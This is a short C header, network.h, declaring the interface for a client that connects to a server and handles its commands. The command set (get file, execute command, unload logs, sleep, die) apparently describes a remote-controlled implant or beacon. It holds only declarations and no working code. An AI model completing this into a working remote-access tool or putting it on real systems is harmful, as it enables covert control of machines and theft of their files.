/**
 * filename: network.h
 * description: create new socket connection with the server, and handle the recv commands
 */

#pragma once

// C includes
#include <stdint.h>

// User includes
#include "tool.h"

typedef enum network_status_e
{
    NETWORK_OK = 0,
    NETWORK_STOP_COMM,
    NETWORK_FAILED,
    NETWORK_INVALID,
    NETWORK_NOMEM,
} network_status_t;

typedef enum cmd_status_e
{
    CMD_OK = 0,
    CMD_ERROR,
    CMD_FATAL,
} cmd_status_t;

typedef enum command_code_e
{
    CMD_HELLO        = 0,
    CMD_UNLOAD_LOGS  = 1,
    CMD_GET_FILE     = 2,
    CMD_EXEC_COMMAND = 3,
    CMD_DIE          = 254,
    CMD_SLEEP        = 255,
} command_code_t;

/**
 * Communicates with the tool.
 * Opens a socket using tool->conf.ip and tool->conf.port,
 * sends hello result,
 * handle commands
 * closes socket on finish.
 *
 * Returns network_state_t (NETWORK_OK on success)
 */
network_status_t communicate(const tool_t *tool, unsigned int * out_sleep_duration, int * out_should_die);
